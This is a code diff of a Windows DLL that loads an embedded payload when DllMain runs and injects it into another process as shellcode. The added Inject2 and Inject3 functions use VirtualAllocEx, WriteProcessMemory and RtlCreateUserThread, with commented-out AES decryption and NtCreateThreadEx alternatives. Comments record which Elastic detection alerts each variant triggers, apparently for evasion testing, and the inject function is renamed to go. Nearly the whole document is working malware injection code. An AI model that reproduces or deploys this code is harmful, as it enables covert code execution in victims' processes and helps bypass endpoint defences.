@@ -143,7 +143,13 @@ int FindTarget(const char *procname) {
 
 // classic injection
 int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
-
+	/*
+	Elastic Alerts:
+		Malicious Behavior Detection Alert: Potential Process Creation via ShellCode
+		Malicious Behavior Detection Alert: Process Memory Write to a Non Child Process
+		Malicious Behavior Detection Alert: Remote Memory Write to Trusted Target Process
+		Memory Threat Detection Alert: Shellcode Injection
+	*/
 	LPVOID pRemoteCode = NULL;
 	HANDLE hThread = NULL;
 
@@ -165,6 +171,46 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 
 // variants of classic injection
 int Inject2(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
+	/*
+	Elastic Alerts:
+		Malicious Behavior Detection Alert: Potential Process Creation via ShellCode
+		Malicious Behavior Detection Alert: Process Memory Write to a Non Child Process
+		Malicious Behavior Detection Alert: Remote Memory Write to Trusted Target Process
+		Memory Threat Detection Alert: Shellcode Injection
+	*/
+	LPVOID pRemoteCode = NULL;
+	HANDLE hThread = NULL;
+	CLIENT_ID cid;
+
+	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
+	// NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateThreadEx");
+
+	// Decrypt payload
+	// AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
+
+	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
+	
+	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteCode, 0, &hThread, &cid);
+	// pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);
+	if (hThread != NULL) {
+			WaitForSingleObject(hThread, 500);
+			CloseHandle(hThread);
+			return 0;
+	}
+	return -1;
+}
+
+
+// variants of classic injection
+int Inject3(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
+	/*
+	Elastic Alerts:
+		Malicious Behavior Detection Alert: Potential Process Creation via ShellCode
+		Malicious Behavior Detection Alert: Process Memory Write to a Non Child Process
+		Malicious Behavior Detection Alert: Remote Memory Write to Trusted Target Process
+		Memory Threat Detection Alert: Shellcode Injection
+	*/
 
 	LPVOID pRemoteCode = NULL;
 	HANDLE hThread = NULL;
@@ -190,7 +236,7 @@ int Inject2(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 }
 
 
-int inject() {
+int go() {
     
 	int pid = 0;
     HANDLE hProc = NULL;
@@ -223,7 +269,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         {
             // Load payload from embedded resource
             if (LoadPayloadFromResource(hModule)) {
-                inject();
+                go();
             }
         }
         break;
